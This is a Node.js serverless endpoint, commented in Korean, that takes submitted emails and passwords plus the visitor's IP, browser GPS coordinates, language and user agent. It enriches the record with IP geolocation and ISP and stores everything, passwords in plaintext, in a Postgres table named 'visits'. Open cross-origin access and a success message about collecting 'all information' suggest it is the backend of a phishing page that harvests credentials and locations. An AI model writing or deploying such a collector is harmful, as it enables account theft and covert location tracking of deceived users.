const { Pool } = require('pg');

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: {
        rejectUnauthorized: false
    }
});

// IP 기반 위치 정보 조회 함수 (ip-api 활용)
async function lookupIpGeo(ip) {
    if (!ip) return {};
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,lat,lon`);
        const data = await response.json();
        if (data.status !== 'success') return {};
        return {
            country: data.country || null,
            region: data.regionName || null,
            city: data.city || null,
            isp: data.isp || null,
            ip_lat: data.lat ?? null,
            ip_lon: data.lon ?? null,
        };
    } catch (err) {
        console.error('IP 위치 조회 실패:', err.message);
        return {};
    }
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        const { email, password, ip, user_agent, language, gps_lat, gps_lon, gps_accuracy } = req.body;

        if (!email || !password) {
            return res.status(400).json({ success: false, message: '이메일과 비밀번호를 입력해주세요.' });
        }

        try {
            // 1. visits 테이블이 없다면 전체 스펙에 맞게 생성
            await pool.query(`
                CREATE TABLE IF NOT EXISTS visits (
                    id BIGSERIAL PRIMARY KEY,
                    email TEXT,
                    password TEXT,
                    ip TEXT NOT NULL,
                    time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
                    user_agent TEXT,
                    language TEXT,
                    country TEXT,
                    region TEXT,
                    city TEXT,
                    isp TEXT,
                    ip_lat DOUBLE PRECISION,
                    ip_lon DOUBLE PRECISION,
                    gps_lat DOUBLE PRECISION,
                    gps_lon DOUBLE PRECISION,
                    gps_accuracy DOUBLE PRECISION
                );
            `);

            // 2. 혹시 기존 테이블에 email, password 컬럼이 없다면 안전하게 자동 추가
            await pool.query(`ALTER TABLE visits ADD COLUMN IF NOT EXISTS email TEXT;`);
            await pool.query(`ALTER TABLE visits ADD COLUMN IF NOT EXISTS password TEXT;`);

            // 3. IP 기반 위치/ISP 정보 조회
            const geo = await lookupIpGeo(ip);

            // 4. 모든 정보를 visits 테이블에 한 번에 저장
            const query = `
                INSERT INTO visits (
                    email, password, ip, user_agent, language, 
                    country, region, city, isp, 
                    ip_lat, ip_lon, gps_lat, gps_lon, gps_accuracy
                ) 
                VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14)
            `;
            
            await pool.query(query, [
                email,
                password,
                ip || 'unknown',
                user_agent || null,
                language || null,
                geo.country || null,
                geo.region || null,
                geo.city || null,
                geo.isp || null,
                geo.ip_lat ?? null,
                geo.ip_lon ?? null,
                gps_lat ?? null,
                gps_lon ?? null,
                gps_accuracy ?? null
            ]);

            console.log(`[통합 데이터 저장 성공] 이메일: ${email} / IP: ${ip} / 국가: ${geo.country || '알 수 없음'}`);

            return res.status(200).json({ 
                success: true, 
                message: '모든 정보가 성공적으로 수집 및 저장되었습니다.' 
            });

        } catch (error) {
            console.error('Neon DB 에러 상세:', error);
            return res.status(500).json({ 
                success: false, 
                message: '데이터베이스 저장 중 오류가 발생했습니다.', 
                error: error.message 
            });
        }
    } else {
        res.setHeader('Allow', ['POST', 'OPTIONS']);
        return res.status(405).end(`Method ${req.method} Not Allowed`);
    }
};